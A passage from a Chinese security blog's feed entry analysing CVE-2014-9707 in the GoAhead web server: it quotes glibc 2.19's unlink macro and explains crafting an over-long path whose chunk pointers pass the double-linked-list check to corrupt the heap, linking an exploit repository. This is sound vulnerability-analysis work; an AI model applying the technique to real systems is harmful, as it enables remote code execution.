<p>蛋糕打造过程：<br>因为glibc 2.19在unlink判断了fd和bk，所以想要直接通过fd和bk来覆盖函数地址是不可能了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">   	FD = P-&gt;fd;								      \</span><br><span class="line">   	BK = P-&gt;bk;								      \</span><br><span class="line">   	<span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">     		malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);      \</span><br><span class="line">   	<span class="keyword">else</span> &#123;								      \</span><br><span class="line">       	FD-&gt;bk = BK;							      \</span><br><span class="line">       	BK-&gt;fd = FD;							      \</span><br><span class="line">       	<span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">           	&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">           	assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);			      \</span><br><span class="line">           	assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);			      \</span><br><span class="line">           	<span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">               	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                 		FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">               	<span class="keyword">else</span> &#123;							      \</span><br><span class="line">                   	FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                   	FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                   	P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                   	P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                 	&#125;							      \</span><br><span class="line">             	&#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">               	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">               	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">             &#125;								      \</span><br><span class="line">         &#125;								      \</span><br><span class="line">     &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>glibc 2.19的unlink如上。</p>
<p>从代码可以看出，Relase模式下，是对fd_nextsize和bk_nextsize没有进行判断的，但是fd_nextsize和bk_nextsize是在large blocks才有的，所以需要构造一个大于512字节(32位系统）的块。</p>
<p>我构造的path:<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/img/hello201607062343000001.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure><br>当segments被释放时，path会被认为是已经释放了的块，所以会触发consolidate forward。<br>fd和bk都指向path的地址，以通过”corrupted double-linked list”检查。</p>
<p><a href="https://github.com/ench4nt3r/cve-2014-9707" target="_blank" rel="noopener">exp</a>执行结果:<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/img/hello2016070623420000.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure></p>
<h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p>[1]<a href="http://cve.scap.org.cn/CVE-2014-9707.html" target="_blank" rel="noopener">SCAP中文社区</a></p>
<p>[2]<a href="http://seclists.org/fulldisclosure/2015/Mar/157" target="_blank" rel="noopener">Advisory: CVE-2014-9707</a></p>
<p>[3]<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="noopener">Understanding glibc malloc</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Embedthis Software GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器。&lt;br&gt;Embedthis Software GoAhead 3.0.0版本至3.4.1版本中存在安全漏洞，该漏洞源于程序没有正确处理以‘.’字符开始的路径部分。远程攻击者可借助特制的URI利用该漏洞实施目录遍历攻击，造成拒绝服务（基于堆的缓冲区溢出和崩溃），也可能执行任意代码。[1]&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://www.ench4nt3r.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
